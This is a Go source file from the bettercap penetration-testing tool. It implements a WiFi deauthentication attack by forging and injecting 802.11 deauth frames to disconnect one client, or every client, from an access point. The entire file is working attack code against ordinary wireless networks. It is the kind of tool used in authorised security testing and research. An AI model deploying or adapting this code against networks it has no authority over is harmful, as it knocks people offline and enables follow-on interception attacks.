package modules

import (
	"fmt"
	"net"
	"time"

	"github.com/bettercap/bettercap/log"
	"github.com/bettercap/bettercap/network"
	"github.com/bettercap/bettercap/packets"
)

func (w *WiFiModule) injectPacket(data []byte) {
	if err := w.handle.WritePacketData(data); err != nil {
		log.Error("Could not inject WiFi packet: %s", err)
		w.Session.Queue.TrackError()
	} else {
		w.Session.Queue.TrackSent(uint64(len(data)))
	}
	// let the network card breath a little
	time.Sleep(10 * time.Millisecond)
}

func (w *WiFiModule) sendDeauthPacket(ap net.HardwareAddr, client net.HardwareAddr) {
	for seq := uint16(0); seq < 64 && w.Running(); seq++ {
		if err, pkt := packets.NewDot11Deauth(ap, client, ap, seq); err != nil {
			log.Error("Could not create deauth packet: %s", err)
			continue
		} else {
			w.injectPacket(pkt)
		}

		if err, pkt := packets.NewDot11Deauth(client, ap, ap, seq); err != nil {
			log.Error("Could not create deauth packet: %s", err)
			continue
		} else {
			w.injectPacket(pkt)
		}
	}
}

func (w *WiFiModule) startDeauth(to net.HardwareAddr) error {
	// if not already running, temporarily enable the pcap handle
	// for packet injection
	if w.Running() == false {
		if err := w.Configure(); err != nil {
			return err
		}
		defer w.handle.Close()
	}

	w.writes.Add(1)
	defer w.writes.Done()

	bssid := to.String()

	// are we deauthing every client of a given access point?
	if ap, found := w.Session.WiFi.Get(bssid); found == true {
		clients := ap.Clients()
		log.Info("Deauthing %d clients from AP %s ...", len(clients), ap.ESSID())
		w.onChannel(network.Dot11Freq2Chan(ap.Frequency), func() {
			for _, c := range clients {
				if w.Running() == false {
					break
				}
				w.sendDeauthPacket(ap.HW, c.HW)
			}
		})

		return nil
	}

	// search for a client
	aps := w.Session.WiFi.List()
	for _, ap := range aps {
		if w.Running() == false {
			break
		} else if c, found := ap.Get(bssid); found == true {
			log.Info("Deauthing client %s from AP %s ...", c.HwAddress, ap.ESSID())
			w.onChannel(network.Dot11Freq2Chan(ap.Frequency), func() {
				w.sendDeauthPacket(ap.HW, c.HW)
			})
			return nil
		}
	}

	return fmt.Errorf("%s is an unknown BSSID.", bssid)
}
